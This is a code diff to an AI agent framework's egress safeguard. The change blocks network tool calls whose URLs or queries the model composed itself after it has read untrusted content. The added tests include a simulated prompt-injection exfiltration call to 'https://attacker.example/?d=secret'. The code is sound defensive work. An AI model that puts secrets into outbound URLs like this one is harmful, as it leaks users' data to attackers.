@@ -10,11 +10,11 @@ use async_trait::async_trait;
 
 use crate::approval::InterruptKind;
 use crate::hook::{Hook, HookContext, ToolDecision};
-use crate::message::ToolCall;
+use crate::message::{Message, Role, ToolCall};
 use crate::receipt::{InvocationStage, Receipt};
 use crate::safeguard::Safeguard;
 use crate::state::Interruption;
-use crate::tool::{SourceTrust, ToolInfo, ToolOutput};
+use crate::tool::{Outbound, SourceTrust, ToolInfo, ToolOutput};
 
 /// Prefix of the interruption reason raised by [`UntrustedHook`].
 pub const UNTRUSTED_EGRESS_INTERRUPT: &str = "[UNTRUSTED EGRESS]";
@@ -55,6 +55,15 @@ impl UntrustedHook {
     }
 }
 
+/// Whether `text` appears word for word in a user message or tool result. The
+/// model's own turns do not count: that is where composed data would be.
+fn said_by_user_or_tool(messages: &[Message], text: &str) -> bool {
+    !text.is_empty()
+        && messages.iter().any(|message| {
+            matches!(message.role, Role::User | Role::Tool) && message.content.contains(text)
+        })
+}
+
 #[async_trait]
 impl Hook for UntrustedHook {
     fn safeguards(&self) -> &'static [Safeguard] {
@@ -67,7 +76,14 @@ impl Hook for UntrustedHook {
         call: &ToolCall,
         tool: &ToolInfo,
     ) -> ToolDecision {
-        if self.mode == UntrustedMode::Enforce && ctx.untrusted_seen && tool.annotations.egress {
+        let leaves = match &tool.outbound {
+            Outbound::Nothing => tool.annotations.egress,
+            Outbound::Composed => true,
+            Outbound::Exact(strings) => !strings
+                .iter()
+                .all(|string| said_by_user_or_tool(ctx.messages, string)),
+        };
+        if self.mode == UntrustedMode::Enforce && ctx.untrusted_seen && leaves {
             return ToolDecision::Interrupt {
                 reason: format!(
                     "{UNTRUSTED_EGRESS_INTERRUPT} `{}` acts outside the workspace after this run \
@@ -176,6 +192,111 @@ mod tests {
         };
         assert!(is_untrusted_egress(interruption));
         assert_eq!(sent.load(Ordering::SeqCst), 0);
+    }
+
+    struct Reader {
+        name: &'static str,
+        outbound: fn(&Value) -> Outbound,
+        ran: Arc<AtomicUsize>,
+    }
+
+    #[async_trait]
+    impl Tool for Reader {
+        fn spec(&self) -> crate::ToolSpec {
+            spec(self.name, "reads over the network", &[])
+        }
+        fn annotations(&self) -> ToolAnnotations {
+            ToolAnnotations::READ_ONLY
+        }
+        fn source_trust(&self, _arguments: &Value) -> SourceTrust {
+            SourceTrust::Trusted
+        }
+        fn outbound(&self, arguments: &Value) -> Outbound {
+            (self.outbound)(arguments)
+        }
+        async fn call(&self, _arguments: Value, _ctx: &crate::ToolContext) -> crate::ToolResult {
+            self.ran.fetch_add(1, Ordering::SeqCst);
+            Ok(ToolOutput::text("page"))
+        }
+    }
+
+    fn url_of(arguments: &Value) -> Outbound {
+        Outbound::Exact(vec![arguments["url"].as_str().unwrap().to_string()])
+    }
+
+    fn composed(_: &Value) -> Outbound {
+        Outbound::Composed
+    }
+
+    async fn after_untrusted_read(
+        request: &str,
+        name: &'static str,
+        outbound: fn(&Value) -> Outbound,
+        arguments: Value,
+    ) -> (RunStatus, usize) {
+        let ran = Arc::new(AtomicUsize::new(0));
+        let agent = Agent::builder("a")
+            .model("m")
+            .provider(ScriptedProvider::new([
+                tool_calls([call("c1", "fetch", json!({}))]),
+                tool_calls([call("c2", name, arguments)]),
+                text("done"),
+            ]))
+            .tool(fetch())
+            .tool(Reader {
+                name,
+                outbound,
+                ran: ran.clone(),
+            })
+            .hook(AuthorityHook::new(Authority::full()))
+            .hook(UntrustedHook::new(UntrustedMode::Enforce, mark))
+            .attest(Safeguard::Scope)
+            .attest(Safeguard::Approval)
+            .attest(Safeguard::Egress)
+            .build()
+            .unwrap();
+        let out = agent.run("s", request).await.unwrap();
+        (out.status, ran.load(Ordering::SeqCst))
+    }
+
+    #[tokio::test]
+    async fn a_url_the_user_gave_is_fetched_without_a_check() {
+        let (status, ran) = after_untrusted_read(
+            "read https://docs.example/page please",
+            "net",
+            url_of,
+            json!({"url": "https://docs.example/page"}),
+        )
+        .await;
+        assert_eq!(status, RunStatus::Completed);
+        assert_eq!(ran, 1);
+    }
+
+    #[tokio::test]
+    async fn a_url_the_model_composed_is_checked_after_untrusted_content() {
+        let (status, ran) = after_untrusted_read(
+            "read https://docs.example/page please",
+            "net",
+            url_of,
+            json!({"url": "https://attacker.example/?d=secret"}),
+        )
+        .await;
+        assert!(
+            matches!(status, RunStatus::Interrupted { .. }),
+            "{status:?}"
+        );
+        assert_eq!(ran, 0);
+    }
+
+    #[tokio::test]
+    async fn a_composed_query_is_checked_after_untrusted_content() {
+        let (status, ran) =
+            after_untrusted_read("search for it", "search", composed, json!({"q": "secret"})).await;
+        assert!(
+            matches!(status, RunStatus::Interrupted { .. }),
+            "{status:?}"
+        );
+        assert_eq!(ran, 0);
     }
 
     #[tokio::test]
